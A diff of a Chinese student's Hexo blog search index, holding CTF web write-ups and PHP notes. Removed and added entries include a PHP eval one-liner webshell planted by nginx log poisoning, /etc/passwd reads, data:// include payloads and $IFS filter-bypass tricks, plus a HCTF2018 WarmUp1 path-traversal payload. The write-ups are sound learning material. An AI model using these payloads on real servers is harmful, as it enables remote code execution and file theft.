@@ -1,295 +1,341 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>一句话木马简单例题web80</title>
-      <link href="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
-      <url>/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
-      
-        <content type="html"><![CDATA[<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>这道题把协议也过滤,比如说php,data协议,所以我们可以使用一句话协议木马,比如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><h4 id="木马分析："><a href="#木马分析：" class="headerlink" title="木马分析："></a>木马分析：</h4><h5 id="插入位置"><a href="#插入位置" class="headerlink" title="插入位置:"></a>插入位置:</h5><p>1.首先，我们需要知道日志的位置,日志文件根据服务器的配置不同,先要了解服务器是nginx还是apache,然后再去查看日志文件位置。<br>payloads:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=/etc/passwd</span><br></pre></td></tr></table></figure><p>可以发现回显<br>2.然后通过nginx日志默认路径打开日志文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>3.将payloads写入日志文件:<br>为什么要在UA(user-agent)中写入payloads?因为UA是浏览器的标识符,方便隐藏。<br>如图:</p><img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image.png" class="" title="image"><h5 id="url中远程文件包含触发"><a href="#url中远程文件包含触发" class="headerlink" title="url中远程文件包含触发:"></a>url中远程文件包含触发:</h5><p>写入payloads:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure><p>先调出文件:</p><img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1.png" class="" title="image-1"><p>然后再查看日志文件:<br>写入payloads:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;cat fl0g.php&quot;);</span><br></pre></td></tr></table></figure><p>嘻嘻,其实不行,要用URL编码:就是要把cat fl0g.php进行编码才可以,<br>这里存疑,为什么要用URL编码?之前system(“ls”)不用编码,为什么这里要编码?<br>应该写作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log&amp;1=system(%22cat%20fl0g.php%22)%3</span><br></pre></td></tr></table></figure><p>才可以利用repeater回显:</p><img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1-1736824226811-3-1736824231038-5.png" class="" title="image-1"><p><strong>这个点还是需要解决!</strong><br>我现在传参还是优先用URL编码传参罢</p>]]></content>
-      
-      
+<search>
+  <entry>
+    <title>我的第一篇博客</title>
+    <url>/2025/01/11/25.1.9/</url>
+    <content><![CDATA[<h3 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h3><p>第一次写博客,这是一个测试</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>bp爆破中的变量赋值</title>
+    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
+    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
+<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
+<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
+<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
+<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
+]]></content>
       <categories>
-          
-          <category> ctfshow web </category>
-          
+        <category>web安全</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 文件包含 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>命令执行:使用文件包含绕过</title>
-      <link href="/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/"/>
-      <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
-      
-        <content type="html"><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p><h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure><h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过:</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>]]></content>
-      
-      
+      <tags>
+        <tag>bp爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HCTF2018 WarmUp1代码审计:include分割符</title>
+    <url>/2025/01/14/2018-WarmUp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-include%E5%88%86%E5%89%B2%E7%AC%A6/</url>
+    <content><![CDATA[<h3 id="HCTF2018-Warmup1-代码审计"><a href="#HCTF2018-Warmup1-代码审计" class="headerlink" title="HCTF2018 Warmup1 代码审计"></a>HCTF2018 Warmup1 代码审计</h3><h4 id="第一步-查看源码"><a href="#第一步-查看源码" class="headerlink" title="第一步:查看源码"></a>第一步:查看源码</h4>
+
+<p>一张大脸,先检查源码：发现:</p>
+<img src="/2025/01/14/2018-WarmUp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-include%E5%88%86%E5%89%B2%E7%AC%A6/image-20250114210616445.png" class="" title="image-20250114210616445">
+<p>直接访问这个文件,发现一堆代码,需要代码审计:</p>
+<h4 id="第二步-开始审计"><a href="#第二步-开始审计" class="headerlink" title="第二步,开始审计"></a>第二步,开始审计</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这道题总结出来的经验:<br>先不管前面的类,直接看后面的怎么包含file。<br><strong>因为我们的逻辑很清楚:</strong><br>要想得到下一步的线索,就必须利用输入的payloads得到更多的回显,而要得到回显,就是要成功通过前面checkFile()的检查,使得我们传入的被$_REQUEST参数能够被include包含,从而取得回显。<br><strong>在类后面要被include的条件是:</strong><br>file的内容是非空的,<br>file要是字符串<br>在emm类里面继承过来的file文件需要经过处理之后返回为true<br>关键是checkFile要为true。那我们就来看checkFile里面怎么让file检查为true.</p>
+<h5 id="第一步-参数传入-以获得线索"><a href="#第一步-参数传入-以获得线索" class="headerlink" title="第一步,参数传入,以获得线索"></a>第一步,参数传入,以获得线索</h5><p>这里我们就先看了前几个代码块,先看看要满足他们的条件,我们需要传入怎样的参数。<br>这也算是做题的经验了,因为我们不可能一步到位直接得到flag所在文件的名称，先要对前面的函数进行试探输入payloads得到线索。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<p>($page在这里指的是checkFile()这个函数里面的参数)<br>首先定义了一个数组,其中有source.php和hint.php，如果没有检查到page或者page不为字符串,那么就会返回为false:<br>有返回,那这个checkFile函数也就不会再继续下去了,并且也会返回false,导致我们的$file参数无法被include读取。<br><strong>这里有个重要的知识点:</strong><br>即if括号内部的布尔值对程序整体运行的影响,以及return对整体程序的影响,具体见我分类分在php类别里的博客。<br>由于hint.php在白名单中,完全符合整个checkFile()返回true的条件。<br>那我们先试一下hint.php,显示:</p>
+<img src="/2025/01/14/2018-WarmUp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-include%E5%88%86%E5%89%B2%E7%AC%A6/image-20250114213943745.png" class="" title="image-20250114213943745">
+<h5 id="第二步-思考如何利用后续代码块特性绕过。"><a href="#第二步-思考如何利用后续代码块特性绕过。" class="headerlink" title="第二步,思考如何利用后续代码块特性绕过。"></a>第二步,思考如何利用后续代码块特性绕过。</h5><p>这里我们肯定不方便直接抓取这个文件，(这里的直接抓取就是指直接把ffffllllaaaagggg引入REQUEST里面的file参数内,因为这样肯定会被checkFile过滤掉并且返回false,无法被include读取)<br>并且根据这道题后面的条件来看,我们要读取这个文件就要使用上include函数,所以我们要继续往后看,看还需要绕过哪些条件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="variable">$_page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解读代码:<br>这里进行了一个代码的截取,操作,是我们绕过checkFile()函数的关键<br>这里substr截取代码时的第三个参数是截取代码的长度,第二个参数是开始的长度<br>而巧妙之处就在于:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>这段代码将page手动加了一个?然后探测?的位置,而在主流编程语言中,字符串位置的参数都是从0开始的,例如我要探测:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmk&amp;nina?</span><br></pre></td></tr></table></figure>
+<p>这里?的位置在参数8的位置,而截取的时候,长度是8,所以刚好把?前面的截取走了,并没有包含?</p>
+<h5 id="第三步-配置payloads-开始绕过"><a href="#第三步-配置payloads-开始绕过" class="headerlink" title="第三步,配置payloads,开始绕过"></a>第三步,配置payloads,开始绕过</h5><p>所以利用这里$_page截取?前面的字符,并只将这部分截取的字符给函数检查的特性,我们可以在payloads的?前写为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?</span><br></pre></td></tr></table></figure>
+<p>这样$_page就会只截取到hint.php,并且它确实在白名单内,我们得以成功绕过<br><strong>重点又来了:</strong><br>include有个特性:<br>在它读取的文件部分,我们可以用“&#x2F;”符号把文件分成几个部分:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(example1.php\/example2.php)</span><br></pre></td></tr></table></figure>
+<p>include会挨个读取文件,即使第一个文件不存在,它的读取也不会就此停止<br><strong>所以</strong>:我们可以在hint.php?后面先用”&#x2F;“符号进行分&#x3D;分割,再输入我们想读取的文件,flag<br>这里太坑爹了,flag长成:ffffllllaaaagggg,这居然是在暗示我们,flag在上数四级文件夹的目录下,难绷。<br>所以最终的payloads为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>?前面是为了绕过checkFile()的检查,后面则是我们的文件目标<br>而include在读取的时候因为前面hint.php?没法读取,就会读取”&#x2F;“后的文件,从而顺利得到flag。<br>大功告成,若有不足,希望dalao指出(</p>
+]]></content>
       <categories>
-          
-          <category> ctfshow web </category>
-          
+        <category>buuctf</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 命令执行 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>命令执行绕过符号总结</title>
-      <link href="/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%AC%A6%E5%8F%B7%E6%80%BB%E7%BB%93/"/>
-      <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%AC%A6%E5%8F%B7%E6%80%BB%E7%BB%93/</url>
-      
-        <content type="html"><![CDATA[<h3 id="命令执行绕过符号总结"><a href="#命令执行绕过符号总结" class="headerlink" title="命令执行绕过符号总结"></a>命令执行绕过符号总结</h3><p>在命令执行这种题目中我们总会遇到正则过滤,不得不使用一些特殊符号来绕过,下面是常见的符号和对应的绕过方法:</p><h4 id="空格"><a href="#空格" class="headerlink" title="空格:"></a>空格:</h4><p>%20<br>%09<br><strong>Linux知识拓展:</strong></p><ul><li>$IFS(Internal Field Separator),在shell环境里面,这个东西叫做内部字段分隔f符,它可以被设置为很多默认的字符,比如空格,制表符,换行符等。</li><li>虽然它默认为空格,但是我们不可以在shell中直接用$IFS代表空格,我们需要用这些方法来设置:</li><li>$IFS$1,我来解释一下:<br>在 shell 脚本和命令行中，$1 通常表示传递给脚本或函数的第一个位置参数<br>但是在内部字段分割符这个地方,它被用来调取内部字段分隔符的第一个字符,即空格,参数位置为$1的空格。所以我们在这里可以用$IFS$1来绕过空格。</li></ul><h4 id="换行符"><a href="#换行符" class="headerlink" title="换行符:"></a>换行符:</h4><p>%0a</p>]]></content>
-      
-      
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>if代码执行机制</title>
+    <url>/2025/01/14/if%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h3 id="这里我们总结if代码块中布尔值的多少对程序进程的影响"><a href="#这里我们总结if代码块中布尔值的多少对程序进程的影响" class="headerlink" title="这里我们总结if代码块中布尔值的多少对程序进程的影响"></a>这里我们总结if代码块中布尔值的多少对程序进程的影响</h3><h4 id="if条件小括号内的情况"><a href="#if条件小括号内的情况" class="headerlink" title="if条件小括号内的情况"></a>if条件小括号内的情况</h4><h5 id="if括号内为false"><a href="#if括号内为false" class="headerlink" title="if括号内为false"></a>if括号内为false</h5><p>毫无疑问,if代码块里面的代码不会继续运行,此时整个程序会跳过条件括号里为false的这个if代码块继续往下运行。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This will be printed because the if condition was false&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>在上述代码中，因为 if 条件为 false，echo “This will not be printed”; 不会被执行，程序直接执行 echo “This will be printed because the if condition was false”。</p>
+<h5 id="if括号里为true"><a href="#if括号里为true" class="headerlink" title="if括号里为true"></a>if括号里为true</h5><p>当 if 括号内条件为 true 时，if 代码块内的代码会执行。但这并不意味着整个程序会不受影响地继续运行。<br>取决于 if 代码块内的代码：<br>如果 if 代码块内有 return、exit 或 die 等终止程序或函数的语句，程序或函数的执行会被终止。<br>比如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This will be printed&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed because of the return statement&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
+<p>在这种情况下,if代码块内因为有return,所以在同一函数代码空间的echo语句不会被执行。也就是在这一层代码空间内，程序的运行确实被终止了。<br>这就引出了我们接下来要说的一种情况:</p>
+<h4 id="return的辨析"><a href="#return的辨析" class="headerlink" title="return的辨析"></a>return的辨析</h4><p>其实我们在这里可以把return,die,exit这几个对程序运行都有影响的一起说了。<br>1.首先是return，它在,不管是返回什么布尔值,都会使<strong>同一空间代码</strong>停止运行,<br>如果在函数内,它就会使return之后的代码无法运行,如果在类中,也是一样，而我们不推荐把它放在全局代码空间中,这样会使得整个程序停止运行。<br>例如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Before return&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 这里的条件可以根据需要修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;After return&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
+<p>在函数外依然可以调用这个函数,函数外并没有因为前面函数里面有return而被打断,但是这里就只会<br>输出:Before return,不会输出After return<br>在类,即对象class里面情况类似</p>
+<p>在文件包含的情况下:<br>在被包含文件:”included_file.php”内:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Before return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再在另外一个文件中包含它:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;included_file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is after including the file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>只会输出:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before return in included file</span><br><span class="line">This is after including the file</span><br></pre></td></tr></table></figure>
+<p>即:在被包含文件自己代码中,return后面的After return in included file没有输出，程序终止。<br>但是并没有影响去包含这个文件的主文件在后方的”This is after including the file”这句话的输出,<br>所以在文件包含的情景下,return也只会终止自己文件后方的代码，对主文件没有影响。</p>
+<p>2.而die,exit则会直接使整个程序不可运行,没有代码空间的说法。</p>
+]]></content>
